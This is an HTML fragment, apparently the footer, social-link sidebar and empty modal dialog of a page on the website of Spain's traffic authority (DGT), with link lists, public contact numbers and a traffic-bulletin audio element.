				<a title="ir al inicio de la página" aria-label="ir al inicio de la página" href="#" class="go-top icon-chevron" style="display:none"></a>
				<!-- Pie -->
				<footer>
					<div class="container">
						<div class="row">
							<div class="col-lg-4 I">
								<div>
									<div class="logos">
										<a class="navbar-brand gob"  target="_blank"><img src="../assets/images/Logotipo_Footer-DGT.svg" width="300" heigth="57" alt="Ministerio del interior - DGT"></a>
									</div>
									<h2>Sobre la DGT</h2>
									<div class="list list-group about">
										<p>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Sede Electrónica de la DGT</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Revista Tráfico y Seguridad Vial</a>
											<a  class="list-group-item list-group-item-action" target="_blank">Consejo Superior de Tráfico, Seguridad vial y Movilidad Sostenible</a>
											<a  class="list-group-item list-group-item-action" target="_blank">Facturación Electrónica y Perfil del Contratante</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Portal estadístico de la DGT</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Seguridad Vial 2030</a>
										</p>
									</div>
								</div>
							</div>
							<div class="col-lg-4 C">
								<div>
									<h2>A un clic</h2>
									<div class="list list-group click">
										<p>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Ministerio del Interior</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Datos abiertos del Gobierno de España</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Punto de acceso a las Administraciones Públicas</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Cl@ve</a>
											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Portal de Transparencia de la AGE</a>
										</p>
									</div>
								</div>
							</div>
							<div class="col-lg-4 D">
								<div>
									<style>
										.rrssFooter a
										{
										}

										.icon-twitter-foot
										{
											margin-top: 0;
										}
									</style>
									<h2>Contáctanos</h2>
									<ul class="list list-group contact">
										<li class="list-group-item">
											<span><a  class="list-group-item list-group-item-action">060</a></span>
											<span>Teléfono de atención al ciudadano</span>
										</li>
										<li class="list-group-item">
											<span><a  class="list-group-item list-group-item-action">011</a></span>
											<span>Teléfono de información de carreteras</span>
										</li>
										<li class="list-group-item">
											<span><a  class="list-group-item list-group-item-action">987 010 559</a></span>
											<span>Centro de tratamiento de denuncias automatizadas</span>
										</li>
										<li class="list-group-item li-rrssFooter">
											<span class="rrssFooter">
												<a class="icon-instagram-alt"  target="_blank"><span class="sr-only">Instagram</span></a>
												<a class="icon-twitter-foot"  target="_blank"><span class="sr-only">Twitter</span></a>
												<a class="icon-youtube"  target="_blank"><span class="sr-only">Youtube</span></a>
												<a class="icon-facebook-alt"  target="_blank"><span class="sr-only">Facebook</span></a>
											</span>
											<span>&nbsp;Redes Sociales</span>
										</li>
									</ul>
								</div>
							</div>
						</div>
					</div>
					<div class="container-fluid d-flex justify-content-center mt-3">
						<div>
							<a  target="_blank">Aviso legal</a>
							<a  target="_blank">Política de privacidad</a>
							<a  target="_blank">Política de cookies</a>
							<a  target="_blank">Accesibilidad</a>
							<a >Mapa web</a>
						</div>
					</div>
				</footer>
				<!-- Fin Pie -->
				<!-- Social links -->
				<span class="sr-only">Mostrar elementos de contacto</span>
			</button>
			<div class="collapse socialSideBar" id="collapseFixedLinks">
				<div class="social ">
					<ul>
						<li>
							<a class="icon-phone" href="" title="Acceder a conoce la DGT (donde estamos)"><span class="sr-only">Contacto</span></a>
						</li>
						<li>
							<a class="icon-twitter" href="" title="Accede a la cuenta X de la DGT">
								<svg viewBox="-10 -15 40 40" aria-hidden="true" class="r-18jsvk2 r-4qtqp9 r-yyyyoo r-16y2uox r-8kz0gk r-dnmrzs r-bnwqim r-1plcrui r-lrvibr r-lrsllp" style="align-items: center;justify-content: center;">
									<g>
										<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
									</g>
								</svg>
							</a>
						</li>
						<li>
							<a class="icon-facebook" href="" title="Accede a la cuenta Facebook de la DGT"><span class="sr-only">Facebook</span></a>
						</li>
						<li>
							<a class="icon-youtube" href="" title="Accede a la cuenta Youtube de la DGT"><span class="sr-only">Youtube</span></a>
						</li>
						<li>
							<a class="icon-instagram" href="" title="Accede a la cuenta Intagram de la DGT"><span class="sr-only">Instagram</span></a>
						</li>
						<li>
							<a id="social-icon-alert-boletin" class="icon-alert" href="/estaticos/boletin/boletin.mp3" data-title="Consulta la actualidad del trÃ¡fico" title="Escuchar boletín radiofónico">
								<span class="sr-only">Consulta la actualidad del trÃ¡fico</span>
								<audio id="audio-icon-alert-boletin">
									<source src="media/boletin.mp3" type="audio/mpeg">
										Tú navegador no soporta el tag de audio HTML5
									</audio>
								</a>
							</li>
						</ul>
					</div>
				</div>
				<!-- Fin social links -->
				<!-- Ventanas Modales  -->
				<div class="modal-backdrop fade fixed-links-backdrop"></div>
				<!-- Modal Generico -->
				<div class="modal fade" id="genericModal" tabindex="-1" role="dialog" aria-labelledby="modalgenericModalLabel" aria-hidden="true">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<strong><span class="modal-title" id="modalgenericModalLabel"></span></strong>
								<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
							</div>
							<div class="modal-body">
								<div id="qr" style="display:none;"></div>
								<p class="modal-text" style="display:none;"></p>
							</div>
						</div>
					</div>
				</div>
				<!-- Fin Modal Generico -->
				<div id="dynamic"></div>
				<!-- Fin Ventanas Modales  -->
			</body>
		</html>